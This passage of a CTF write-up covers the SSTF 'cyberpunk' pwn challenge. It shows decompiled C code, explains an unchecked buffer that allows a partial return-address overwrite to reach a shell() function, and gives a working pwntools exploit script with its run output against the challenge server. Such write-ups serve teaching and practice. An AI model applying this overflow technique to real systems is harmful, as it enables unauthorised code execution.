                                                   3D   2B   3D   BB   B4   7F 
                                                                               
                                                                               
                                                   BB   F8   F8   E0   E0   7F 
                                                                               
                                                                               
                                                   56   7F   1D   BB   DF   5A 
                                                                               
                                                            $> 
```

The binary let's us select multiple bytes in a cyberpunk hack manner to put together a `code`. 

The issue here is, that it doesn't do a boundary check on the length of the `code` and we can overwrite followup data by just continuing selecting values. 

After selecting a byte the direction will toggle between horizontal and vertical selection, so we have to think a bit ahead, what and how we can overwrite. 

Let's take a look how the pad itself is initialized 

```c
int main(int argc, char **argv, char **env)
{
  unsigned int rand_val; 
  int fd;   
  char pad_values[0x28];
  
  rand_val = 0;

  fd = open("/dev/urandom", 0, env);

  if ( fd == -1 )
    return -1;

  if ( read(fd, &rand_val, 8) == 8 )
  {
    close(fd);
    srand(rand_val);
    
	...

	memset(pad_values, 0, 0x28);
	shuffle_pad(pad_values);
    start_game(pad_values);    
  }
  else
  {
    close(fd);    
	return -1;
  }

  return 0;
}

void shuffle_pad(char *pad_values)
{
  long cur_byte;
  
  for (int y = 0; y <= 5; ++y )
  {
    for (int x = 0; x <= 5; ++x )
    {
      do
      {
        if ((rand() & 1) != 0 )
          cur_byte = (long)shell;
        else
          cur_byte = (long)&system;

        pad_values[6 * y + x] = cur_byte >> (8 * (char)(rand() % 8));
      }
      while (!pad_values[6 * y + x]);
    }
  }
}
```

So, the available bytes in the pad will be bytes from either `shell` or `system` address. This will be useful, since the application uses PIE. 

```c
void start_game(char *pad_values)
{  
  char code[8];

  // Initilaize code
  for (int i = 0; i <= 7; ++i)
    code[i] = 0;

  show_menu();
  handle_menu(code, pad_values);
}
```

*As we can see, 8 bytes on the stack are available, but since we can stuff more into it, we'll be able to overwrite the return address of this function (no canaries in use).* 

*We could probably guess the ASLR addresses from the keypad, but that's not really needed at all, since the binary contains a `shell` function* 

```c
void shell()
{
  execv("/bin/sh", 0LL);
}
```

*Since lowest 3 nibbles of every address will be fix even with ASLR, we can just overwrite the lower two bytes of the return address of `start game` to let it point to `shell` (`0x000555555554b5a`).* 

*Lowest byte will always be `0x5a` and the next byte is just the one from the pad, where the second nibble is `0xb`.* 

*Return address will be at `&code + 16`. After 16 key values the selection direction will be horizontal, so the attack plan will be:* 

*- Read all keypad values* 

*- Find a vertical line, which contains `0x5a` and the byte that ends in `0xb`* 

*- Select 16 random values (but only from other lines, to keep those for overwriting return address)* 

*- Select 0x5a* 

*- Select byte with 0xb nibble* 

*- Quit to trigger shell* 

*Since it's a CTF, I implemented the "game logic" in a quick&dirty way.*  

*- Select a cell, go down (until we find an available value and are not in winning line)* 

*- Select a cell, go right (until we find an available value and are not in winning line)* 

*- Rinse & repeat* 

*This could be improved for sure, since this might not end up in the "winning line", but running it 2 or 3 times mostly ended up successfully, so good enough ;)* 

```python
#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "cyberpunk.sstf.site"
PORT = 31477
PROCESS = "./cyberpunk"

charset = "ABCDEF0123456789"
values = []
curX = 0
curY = 0

def parse_values():
	r.recvuntil("]\n")

	for i in range(6*6):
		ch = r.recv(1)
	
		while ch not in charset:
			ch = r.recv(1)

		V1 = ch + r.recv(1)

		values.append(int("0x"+V1, 16))

def go_down():
	global curX, curY

	curY += 1
	r.sendline("s")
	print r.recvuntil("$> ")

	curY = curY % 6
	curX = curX % 6

def go_right():
	global curX, curY

	curX += 1
	r.sendline("d")
	print r.recvuntil("$> ")

	curY = curY % 6
	curX = curX % 6

def select_cell():
	global curX, curY
	r.sendline(" ")	

	curY = curY % 6
	curX = curX % 6

	values[curY*6+curX] = -1

def exploit(r):
	global curX, curY

	r.recvuntil("break in\n")
	r.sendline("")

	parse_values()
	r.recvuntil("> ")

	# find line which contains 0x5a and 0xXB
	found = False

	for x in range(6):
		found5a = [-1, -1]
		foundXb = [-1, -1]
		
		for y in range(6):
			if values[y*6 + x] == 0x5a:
				found5a = [x, y]
			elif (values[y*6 + x] & 0xf) == 0xb:
				foundXb = [x, y]

		if found5a[1] != -1 and foundXb[1] != -1:
			log.info("Found good line")
			found = True
			break

	print found5a
	print foundXb

	if not found:
		exit()

	# play 16 bytes and end up in line of found values
	curX = 0
	curY = 0
	direction = 2  					# 1 = down 2 = right

	for i in range(16):
		select_cell()

		if direction == 2:			
			go_down()

			while values[curY*6+curX] == -1:
				go_down()
			
			direction = 1
		elif direction == 1:
			go_right()

			while (values[curY*6+curX] == -1) or (curX == found5a[0]):
				go_right()

			direction = 2

	r.interactive()
	
	return

if __name__ == "__main__":
	# e = ELF("./cyberpunk")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./cyberpunk")
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)
```

Running this, will hopefully select 16 random values and end up in our final line. 

```
$ python xpl.py 1
[+] Opening connection to cyberpunk.sstf.site on port 31477: Done
[*] Found good line
[3, 1]
[3, 5]

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  00  00  00  00  00  00  00 ]
                                                 ┌─┴─┐                         
                                                 │   │  55   7F   5A   7F   55 
                                                 └─┬─┘                         
                                                   │                           
                                                   7F   44   0B   5A   7E   0A 
                                                   │                           
                                                   │                           
                                                   44   55   0B   10   13   55 
                                                   │                           
                                                   │                           
                                                   13   10   7F   FE   FE   44 
                                                   │                           
                                                   │                           
                                                   7F   0A   FE   F8   F8   5A 
                                                   │                           
                                                   │                           
                                                   7E   10   13   0B   7E   0A 
                                                   │                           
                                                            $> 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  00  00  00  00  00  00  00 ]
                                                   │                           
                                                   │    55   7F   5A   7F   55 
                                                   │                           
                                                 ┌─┴─┐                         
                                                 │#7F│  44   0B   5A   7E   0A 
                                                 └─┬─┘                         
                                                   │                           
                                                   44   55   0B   10   13   55 
                                                   │                           
                                                   │                           
                                                   13   10   7F   FE   FE   44 
                                                   │                           
                                                   │                           
                                                   7F   0A   FE   F8   F8   5A 
                                                   │                           
                                                   │                           
                                                   7E   10   13   0B   7E   0A 
                                                   │                           
                                                            $> 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
